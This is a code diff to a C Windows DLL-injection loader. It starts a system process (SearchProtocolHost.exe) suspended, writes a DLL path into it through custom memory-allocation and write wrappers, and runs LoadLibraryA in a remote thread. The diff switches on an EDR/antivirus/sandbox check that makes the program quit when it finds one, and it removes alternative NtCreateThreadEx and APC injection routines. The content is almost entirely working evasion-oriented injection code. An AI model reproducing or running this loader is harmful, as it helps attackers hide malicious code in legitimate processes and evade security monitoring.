@@ -25,15 +25,13 @@ void StealthExec(HANDLE hProc, const char *dllN)
         printf("[*] Successfully resolve LoadLibraryA.\n");
     }
 
-    memLoc = VirtualAllocEx(hProc, 0, sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    /*
     status = CustAVM(hProc, &memLoc, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (status != 0)
     {
         printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
         return;
     }
-    */
+    
     
 
     if (memLoc == NULL)
@@ -47,8 +45,7 @@ void StealthExec(HANDLE hProc, const char *dllN)
     }
 
     // Write DLL Path to Remote Process
-    //status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
-    status = WriteProcessMemory(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
+    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
     if (status != 1)
     {
         printf("[!] Memory write failed (Err: 0x%lX).\n", status);
@@ -79,33 +76,6 @@ void StealthExec(HANDLE hProc, const char *dllN)
     }
     ResumeThread(hThreadRemote);
     CloseHandle(hThreadRemote);
-    
-    /*
-    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
-
-    hThreadRemote = NULL;
-    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProc, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, FALSE, 0, 0, 0, NULL);
-
-    printf("[*] NtCreateThreadEx status: 0x%lx\n", status);
-    DWORD waitResult = WaitForSingleObject(hThread, 5000);  // Wait for 5 seconds
-    if (waitResult == WAIT_TIMEOUT) {
-        printf("[!] Remote thread timed out!\n");
-        TerminateThread(hThread, 0);  // Kill stuck thread
-        return;
-    } else if (waitResult == WAIT_FAILED) {
-        printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
-        CloseHandle(hThread);
-        return;
-    }
-    ResumeThread(hThread);
-    CloseHandle(hThread);
-    */
-
-    /*
-    QueueUserAPC((PAPCFUNC)pLLoad, hThread, (ULONG_PTR)memLoc);
-    ResumeThread(hThread);
-    CloseHandle(hThread); 
-    */
 
     printf("[*] Successfully injected module\n");
 }
@@ -114,10 +84,10 @@ void StealthExec(HANDLE hProc, const char *dllN)
 int main(int argc, char *argv[])
 {
     // Check For EDR/AV/Sandbox env
-    // if (PerfomChecksEnv())
-    // {
-    //     return 0;
-    // }
+    if (PerfomChecksEnv())
+    {
+        return 0;
+    }
 
     // If no DLL given, abort.
     if (argc != 2)
@@ -131,11 +101,11 @@ int main(int argc, char *argv[])
     STARTUPINFOA sInfo = {0};
     PROCESS_INFORMATION pInfo = {0};
 
-    // const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
-    // const char *procName = "SearchProtocolHost.exe";
+    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
+    const char *procName = "SearchProtocolHost.exe";
     // Also work with explorer.exe
-    const char* procPath = "C:\\Windows\\explorer.exe";
-    const char *procName = "Explorer.exe";
+    // const char* procPath = "C:\\Windows\\explorer.exe";
+    // const char *procName = "Explorer.exe";
 
     if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
     {
